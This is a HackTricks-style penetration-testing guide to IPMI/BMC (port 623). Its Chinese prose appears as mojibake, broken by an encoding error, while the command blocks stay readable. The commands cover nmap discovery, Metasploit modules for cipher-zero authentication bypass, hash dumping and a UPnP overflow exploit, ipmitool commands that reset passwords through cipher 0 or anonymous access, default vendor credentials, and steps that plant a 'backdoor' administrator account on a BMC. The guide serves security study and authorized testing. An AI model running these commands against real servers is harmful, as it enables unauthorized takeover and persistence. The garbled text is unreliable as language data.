# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

### **IPMIæ¦‚è¿°**

**[æ™ºèƒ½å¹³å°ç®¡ç†æ¥å£ï¼ˆIPMIï¼‰](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)**æä¾›äº†ä¸€ç§æ ‡å‡†åŒ–çš„æ–¹æ³•ï¼Œç”¨äºè¿œç¨‹ç®¡ç†å’Œç›‘æ§è®¡ç®—æœºç³»ç»Ÿï¼Œç‹¬ç«‹äºæ“ä½œç³»ç»Ÿæˆ–ç”µæºçŠ¶æ€ã€‚è¿™é¡¹æŠ€æœ¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è¿œç¨‹ç®¡ç†ç³»ç»Ÿï¼Œå³ä½¿ç³»ç»Ÿå¤„äºå…³é—­æˆ–æ— å“åº”çŠ¶æ€ï¼Œå¯¹äºä»¥ä¸‹æƒ…å†µå°¤ä¸ºæœ‰ç”¨ï¼š

- æ“ä½œç³»ç»Ÿå¼•å¯¼å‰çš„é…ç½®
- å…³é—­ç”µæºç®¡ç†
- ä»ç³»ç»Ÿæ•…éšœä¸­æ¢å¤

IPMIèƒ½å¤Ÿç›‘è§†æ¸©åº¦ã€ç”µå‹ã€é£æ‰‡é€Ÿåº¦å’Œç”µæºä¾›åº”æƒ…å†µï¼ŒåŒæ—¶æä¾›åº“å­˜ä¿¡æ¯ã€æŸ¥çœ‹ç¡¬ä»¶æ—¥å¿—ï¼Œå¹¶é€šè¿‡SNMPå‘é€è­¦æŠ¥ã€‚å…¶è¿è¡Œæ‰€éœ€çš„å…³é”®ç»„ä»¶åŒ…æ‹¬ç”µæºæºå’ŒLANè¿æ¥ã€‚

è‡ªInteläº1998å¹´æ¨å‡ºä»¥æ¥ï¼ŒIPMIå¾—åˆ°äº†ä¼—å¤šä¾›åº”å•†çš„æ”¯æŒï¼Œç‰¹åˆ«æ˜¯é€šè¿‡2.0ç‰ˆæœ¬å¯¹ä¸²è¡ŒLANçš„æ”¯æŒï¼Œå¢å¼ºäº†è¿œç¨‹ç®¡ç†åŠŸèƒ½ã€‚å…³é”®ç»„ä»¶åŒ…æ‹¬ï¼š

- **ä¸»æ¿ç®¡ç†æ§åˆ¶å™¨ï¼ˆBMCï¼‰ï¼š** IPMIæ“ä½œçš„ä¸»è¦å¾®æ§åˆ¶å™¨ã€‚
- **é€šä¿¡æ€»çº¿å’Œæ¥å£ï¼š** ç”¨äºå†…éƒ¨å’Œå¤–éƒ¨é€šä¿¡ï¼ŒåŒ…æ‹¬ICMBã€IPMBä»¥åŠç”¨äºæœ¬åœ°å’Œç½‘ç»œè¿æ¥çš„å„ç§æ¥å£ã€‚
- **IPMIå­˜å‚¨å™¨ï¼š** ç”¨äºå­˜å‚¨æ—¥å¿—å’Œæ•°æ®ã€‚

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**é»˜è®¤ç«¯å£**ï¼š623/UDP/TCPï¼ˆé€šå¸¸åœ¨UDPä¸Šè¿è¡Œï¼Œä½†ä¹Ÿå¯èƒ½åœ¨TCPä¸Šè¿è¡Œï¼‰

## æšä¸¾

### å‘ç°
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•**è¯†åˆ«**ç‰ˆæœ¬ï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMIæ¼æ´

åœ¨IPMI 2.0é¢†åŸŸï¼ŒDan Farmerå‘ç°äº†ä¸€ä¸ªé‡å¤§çš„å®‰å…¨æ¼æ´ï¼Œé€šè¿‡**å¯†ç ç±»å‹0**æš´éœ²äº†ä¸€ä¸ªæ¼æ´ã€‚è¿™ä¸ªæ¼æ´åœ¨[Dan Farmerçš„ç ”ç©¶](http://fish2.com/ipmi/cipherzero.html)ä¸­æœ‰è¯¦ç»†è®°å½•ï¼Œå…è®¸æœªç»æˆæƒçš„è®¿é—®ï¼Œåªè¦é’ˆå¯¹ä¸€ä¸ªæœ‰æ•ˆç”¨æˆ·æä¾›äº†ä»»ä½•å¯†ç ã€‚è¿™ä¸ªå¼±ç‚¹åœ¨æƒ æ™®ï¼ˆHPï¼‰ã€æˆ´å°”ï¼ˆDellï¼‰å’Œè¶…å¾®ï¼ˆSupermicroï¼‰ç­‰åˆ¶é€ å•†çš„å„ç§BMCä¸­è¢«å‘ç°ï¼Œè¡¨æ˜æ‰€æœ‰IPMI 2.0å®ç°ä¸­å­˜åœ¨æ™®éé—®é¢˜ã€‚

### é€šè¿‡å¯†ç 0ç»•è¿‡IPMIèº«ä»½éªŒè¯

è¦æ£€æµ‹è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹Metasploitè¾…åŠ©æ‰«æç¨‹åºï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
åˆ©ç”¨`ipmitool`å¯ä»¥å®ç°å¯¹æ­¤æ¼æ´çš„åˆ©ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå…è®¸åˆ—å‡ºå’Œä¿®æ”¹ç”¨æˆ·å¯†ç ï¼š
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval**

è¯¥æ¼æ´ä½¿å¾—å¯ä»¥æ£€ç´¢åˆ°ä»»ä½•ç°æœ‰ç”¨æˆ·åçš„ç›å€¼å“ˆå¸Œå¯†ç ï¼ˆMD5å’ŒSHA1ï¼‰ã€‚ä¸ºäº†æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼ŒMetasploitæä¾›äº†ä¸€ä¸ªæ¨¡å—ï¼š
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMIåŒ¿åè®¤è¯**

è®¸å¤šBMCä¸­çš„é»˜è®¤é…ç½®å…è®¸â€œåŒ¿åâ€è®¿é—®ï¼Œå…¶ç‰¹å¾æ˜¯ç©ºç”¨æˆ·åå’Œå¯†ç å­—ç¬¦ä¸²ã€‚å¯ä»¥åˆ©ç”¨è¿™ç§é…ç½®ä½¿ç”¨`ipmitool`æ¥é‡ç½®å…·åç”¨æˆ·è´¦æˆ·çš„å¯†ç ï¼š
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMIæ˜æ–‡å¯†ç **

IPMI 2.0ä¸­çš„ä¸€ä¸ªå…³é”®è®¾è®¡é€‰æ‹©è¦æ±‚åœ¨BMCä¸­å­˜å‚¨æ˜æ–‡å¯†ç ä»¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚Supermicroå°†è¿™äº›å¯†ç å­˜å‚¨åœ¨è¯¸å¦‚`/nv/PSBlock`æˆ–`/nv/PSStore`ç­‰ä½ç½®ï¼Œå¼•å‘äº†é‡å¤§çš„å®‰å…¨é—®é¢˜ï¼š
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Vulnerability**

Supermicroåœ¨å…¶IPMIå›ºä»¶ä¸­åŒ…å«äº†ä¸€ä¸ªUPnP SSDPç›‘å¬å™¨ï¼Œç‰¹åˆ«æ˜¯åœ¨UDPç«¯å£1900ä¸Šï¼Œå¼•å…¥äº†ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚æ ¹æ®[Rapid7çš„æŠ«éœ²](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play)è¯¦ç»†ä»‹ç»çš„Intel UPnPè®¾å¤‡ç‰ˆæœ¬1.3.1ä¸­çš„æ¼æ´ï¼Œå…è®¸å¯¹BMCè¿›è¡Œrootè®¿é—®ï¼š
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### æš´åŠ›ç ´è§£

**HPåœ¨åˆ¶é€ è¿‡ç¨‹ä¸­ä¼šéšæœºç”Ÿæˆé»˜è®¤å¯†ç **ï¼Œç”¨äºå…¶**Integrated Lights Out (iLO)**äº§å“ã€‚è¿™ç§åšæ³•ä¸å…¶ä»–åˆ¶é€ å•†å½¢æˆå¯¹æ¯”ï¼Œåè€…å€¾å‘äºä½¿ç”¨**é™æ€é»˜è®¤å‡­æ®**ã€‚ä»¥ä¸‹æ˜¯å„ç§äº§å“çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç æ‘˜è¦ï¼š

- **HP Integrated Lights Out (iLO)** ä½¿ç”¨**å·¥å‚éšæœºç”Ÿæˆçš„8ä½å­—ç¬¦ä¸²**ä½œä¸ºé»˜è®¤å¯†ç ï¼Œå±•ç¤ºäº†æ›´é«˜çš„å®‰å…¨çº§åˆ«ã€‚
- è¯¸å¦‚**Dellçš„iDRACã€IBMçš„IMM**å’Œ**Fujitsuçš„Integrated Remote Management Controller**ç­‰äº§å“ä½¿ç”¨æ˜“äºçŒœæµ‹çš„å¯†ç ï¼Œå¦‚"calvin"ã€"PASSW0RD"ï¼ˆä½¿ç”¨é›¶ï¼‰å’Œ"admin"ã€‚
- åŒæ ·ï¼Œ**Supermicro IPMI (2.0)ã€Oracle/Sun ILOM**å’Œ**ASUS iKVM BMC**ä¹Ÿä½¿ç”¨ç®€å•çš„é»˜è®¤å‡­æ®ï¼Œå…¶å¯†ç åˆ†åˆ«ä¸º"ADMIN"ã€"changeme"å’Œ"admin"ã€‚

## é€šè¿‡BMCè®¿é—®ä¸»æœº

å¯¹åŸºæ¿ç®¡ç†æ§åˆ¶å™¨ï¼ˆBMCï¼‰çš„ç®¡ç†è®¿é—®æ‰“å¼€äº†è®¿é—®ä¸»æœºæ“ä½œç³»ç»Ÿçš„å„ç§é€”å¾„ã€‚ä¸€ç§ç›´æ¥çš„æ–¹æ³•æ¶‰åŠåˆ©ç”¨BMCçš„é”®ç›˜ã€è§†é¢‘ã€é¼ æ ‡ï¼ˆKVMï¼‰åŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡é‡æ–°å¯åŠ¨ä¸»æœºåˆ°ä¸€ä¸ªroot shellï¼ˆä½¿ç”¨`init=/bin/sh`ï¼‰æˆ–ä»è®¾ç½®ä¸ºæ•‘æ´ç£ç›˜çš„è™šæ‹ŸCD-ROMå¯åŠ¨æ¥å®ç°è¿™ä¸€ç‚¹ã€‚è¿™äº›æ–¹æ³•å…è®¸ç›´æ¥æ“ä½œä¸»æœºçš„ç£ç›˜ï¼ŒåŒ…æ‹¬æ’å…¥åé—¨ã€æ•°æ®æå–æˆ–è¿›è¡Œå®‰å…¨è¯„ä¼°æ‰€éœ€çš„ä»»ä½•æ“ä½œã€‚ç„¶è€Œï¼Œè¿™éœ€è¦é‡æ–°å¯åŠ¨ä¸»æœºï¼Œè¿™æ˜¯ä¸€ä¸ªé‡å¤§ç¼ºç‚¹ã€‚åœ¨ä¸é‡æ–°å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œè®¿é—®æ­£åœ¨è¿è¡Œçš„ä¸»æœºæ›´åŠ å¤æ‚ï¼Œå¹¶ä¸”éšç€ä¸»æœºé…ç½®çš„ä¸åŒè€Œå˜åŒ–ã€‚å¦‚æœä¸»æœºçš„ç‰©ç†æˆ–ä¸²è¡Œæ§åˆ¶å°ä¿æŒç™»å½•çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡BMCçš„KVMæˆ–ä¸²è¡Œ-é€šè¿‡-LANï¼ˆsolï¼‰åŠŸèƒ½è½»æ¾æ¥ç®¡å®ƒï¼Œä½¿ç”¨`ipmitool`ã€‚æ¢ç´¢å…±äº«ç¡¬ä»¶èµ„æºçš„åˆ©ç”¨ï¼Œå¦‚i2cæ€»çº¿å’ŒSuper I/OèŠ¯ç‰‡ï¼Œæ˜¯éœ€è¦è¿›ä¸€æ­¥ç ”ç©¶çš„é¢†åŸŸã€‚

## ä»ä¸»æœºå‘BMCå¼•å…¥åé—¨

åœ¨æ”»å‡»é…å¤‡æœ‰BMCçš„ä¸»æœºåï¼Œ**å¯ä»¥åˆ©ç”¨æœ¬åœ°BMCæ¥å£æ’å…¥åé—¨ç”¨æˆ·å¸æˆ·**ï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºæŒä¹…å­˜åœ¨ã€‚æ­¤æ”»å‡»éœ€è¦åœ¨å—æŸä¸»æœºä¸Šå­˜åœ¨**`ipmitool`**å¹¶æ¿€æ´»BMCé©±åŠ¨ç¨‹åºæ”¯æŒã€‚ä»¥ä¸‹å‘½ä»¤è¯´æ˜äº†å¦‚ä½•ä½¿ç”¨ä¸»æœºçš„æœ¬åœ°æ¥å£å°†æ–°ç”¨æˆ·å¸æˆ·æ³¨å…¥BMCï¼Œç»•è¿‡èº«ä»½éªŒè¯çš„éœ€æ±‚ã€‚è¿™ç§æŠ€æœ¯é€‚ç”¨äºå„ç§æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬Linuxã€Windowsã€BSDï¼Œç”šè‡³DOSã€‚
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `ç«¯å£:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
